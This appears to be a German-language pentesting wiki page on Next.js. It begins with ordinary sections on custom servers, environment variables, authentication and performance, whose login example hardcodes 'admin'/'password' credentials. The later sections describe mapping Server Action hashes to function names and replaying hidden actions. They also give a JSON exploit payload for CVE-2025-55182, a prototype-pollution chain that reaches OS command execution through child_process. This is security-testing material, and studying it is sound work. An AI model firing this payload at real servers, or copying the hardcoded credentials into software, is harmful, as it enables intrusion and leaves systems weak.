**Zweck:** Obwohl Next.js mit einem eingebauten Server geliefert wird, können Sie einen benutzerdefinierten Server für fortgeschrittene Anwendungsfälle erstellen, z. B. für benutzerdefiniertes Routing oder die Integration in bestehende Backend-Dienste.

**Hinweis:** Die Verwendung eines benutzerdefinierten Servers kann die Bereitstellungsoptionen einschränken, insbesondere auf Plattformen wie Vercel, die für den eingebauten Server von Next.js optimiert sind.

**Beispiel:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Zusätzliche Architektur- und Sicherheitsüberlegungen

### Umgebungsvariablen und Konfiguration

**Zweck:** Verwaltung sensibler Informationen und Konfigurationseinstellungen außerhalb des Quellcodes.

**Bewährte Vorgehensweisen:**

- **Verwenden Sie `.env`-Dateien:** Speichern Sie Variablen wie API-Schlüssel in `.env.local` (vom Versionskontrollsystem ausgeschlossen).
- **Sicher auf Variablen zugreifen:** Verwenden Sie `process.env.VARIABLE_NAME`, um auf Umgebungsvariablen zuzugreifen.
- **Geheimnisse niemals im Client offenlegen:** Stellen Sie sicher, dass sensible Variablen nur serverseitig verwendet werden.

**Beispiel:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Hinweis:** Um Variablen nur serverseitig zu halten, lasse sie aus dem `env`-Objekt weg oder versehe sie mit dem Präfix `NEXT_PUBLIC_`, damit sie dem Client zugänglich werden.

### Authentifizierung und Autorisierung

**Vorgehensweise:**

- **Sitzungsbasierte Authentifizierung:** Verwende Cookies, um Benutzersitzungen zu verwalten.
- **Tokenbasierte Authentifizierung:** Implementiere JWTs für zustandslose Authentifizierung.
- **Drittanbieter-Provider:** Integriere OAuth-Provider (z. B. Google, GitHub) mit Bibliotheken wie `next-auth`.

**Sicherheitspraktiken:**

- **Sichere Cookies:** Setze die Attribute `HttpOnly`, `Secure` und `SameSite`.
- **Passwort-Hashing:** Hash Passwörter stets, bevor du sie speicherst.
- **Eingabevalidierung:** Verhindere Injektionsangriffe, indem du Eingaben validierst und säuberst.

**Beispiel:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Performance-Optimierung

**Strategien:**

- **Image Optimization:** Verwende die Next.js-Komponente `next/image` für automatische Bildoptimierung.
- **Code Splitting:** Nutze dynamic imports, um Code zu splitten und die anfänglichen Ladezeiten zu reduzieren.
- **Caching:** Implementiere Caching-Strategien für API-Antworten und statische Assets.
- **Lazy Loading:** Lade Komponenten oder Assets nur, wenn sie benötigt werden.

**Beispiel:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Aufzählung (Hash zum Funktionsnamen über Source Maps)

Moderne Next.js verwendet „Server Actions“, die auf dem Server ausgeführt werden, aber vom Client aufgerufen werden. In der Produktion sind diese Aufrufe undurchsichtig: alle POSTs landen auf einem gemeinsamen Endpoint und werden durch einen build-spezifischen Hash unterschieden, der im `Next-Action`-Header gesendet wird. Beispiel:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wenn `productionBrowserSourceMaps` aktiviert ist, enthalten minifizierte JS-Chunks Aufrufe von `createServerReference(...)`, die genug Struktur (plus zugehörige source maps) leak, um eine Zuordnung zwischen dem Action-Hash und dem ursprünglichen Funktionsnamen wiederherzustellen. Dadurch kannst du Hashes, die in `Next-Action` beobachtet werden, in konkrete Ziele wie `deleteUserAccount()` oder `exportFinancialData()` übersetzen.

### Extraktionsansatz (regex on minified JS + optional source maps)

Durchsuche heruntergeladene JS-Chunks nach `createServerReference` und extrahiere den Hash sowie das Funktions-/Quellensymbol. Zwei nützliche Muster:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Gruppe 1: Server-Action-Hash (40+ hex-Zeichen)
- Gruppe 2: Symbol oder Pfad, das/die über die source map (wenn vorhanden) auf den ursprünglichen Funktionsnamen aufgelöst werden kann

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Praktisches Vorgehen

- Passive Entdeckung beim Browsen: Requests mit `Next-Action`-Headern und JS-Chunk-URLs erfassen.
- Die referenzierten JS-Bundles und die zugehörigen `*.map`-Dateien abrufen (wenn vorhanden).
- Das obige regex ausführen, um ein Hash↔Name-Wörterbuch aufzubauen.
- Das Wörterbuch zum gezielten Testen verwenden:
  - Namensbasierte Triage (z. B. `transferFunds`, `exportFinancialData`).
  - Abdeckung über Builds nach Funktionsnamen verfolgen (Hashes wechseln zwischen Builds).

### Ausführen versteckter Aktionen (vorlagenbasierte Anfrage)

Nehmen Sie einen im Proxy beobachteten gültigen POST als Vorlage und tauschen Sie den Wert von `Next-Action` aus, um eine andere gefundene Aktion anzusprechen:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Replay in Repeater und teste Autorisierung, Eingabevalidierung und Business-Logik von sonst nicht erreichbaren Aktionen.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) automatisiert das oben Beschriebene in Burp:
- Durchsucht die Proxy-History nach JS-Chunks, extrahiert `createServerReference(...)`-Einträge und parst source maps, wenn verfügbar.
- Pflegt ein durchsuchbares hash↔function-name-Wörterbuch und entdupliziert über Builds anhand des function name.
- Kann ein gültiges Template-POST finden und einen versandbereiten Repeater-Tab öffnen, in dem der Hash der Ziel-Action eingetauscht ist.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Erfordert `productionBrowserSourceMaps` in production aktiviert, um Namen aus bundles/source maps wiederherzustellen.
- Function-name disclosure ist für sich genommen keine Schwachstelle; nutze sie, um die Entdeckung zu leiten und die Autorisierung jeder Action zu testen.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments, die Server Actions über `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** exponieren, enthalten während der **Flight**-Chunk-Deserialisierung eine kritische serverseitige prototype pollution. Durch das Einfügen von `$`-Referenzen in eine Flight-Payload kann ein Angreifer von verschmutzten Prototypen zu beliebiger JavaScript-Ausführung und anschließend zu OS-Kommandoausführung innerhalb des Node.js-Prozesses pivoten.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Angriffskette in Flight-Chunks

1. **Prototype pollution primitive:** Setze `"then": "$1:__proto__:then"`, sodass der Resolver eine `then`-Funktion auf `Object.prototype` schreibt. Jedes Plain-Object, das danach verarbeitet wird, wird zu einem thenable, wodurch der Angreifer den asynchronen Kontrollfluss innerhalb der RSC-Interna beeinflussen kann.
2. **Rebinding an den globalen `Function`-Konstruktor:** Zeige `_response._formData.get` auf `"$1:constructor:constructor"`. Während der Auflösung führt `object.constructor` → `Object` und `Object.constructor` → `Function`, sodass zukünftige Aufrufe von `_formData.get()` tatsächlich `Function(...)` ausführen.
3. **Codeausführung über `_prefix`:** Platziere JavaScript-Quellcode in `_response._prefix`. Wenn das verschmutzte `_formData.get` aufgerufen wird, wertet das Framework `Function(_prefix)(...)` aus, sodass das eingeschleuste JS `require('child_process').exec()` oder jede andere Node-Primitive ausführen kann.

#### Payload-Skelett
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
## Referenzen

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)

{{#include ../../banners/hacktricks-training.md}}
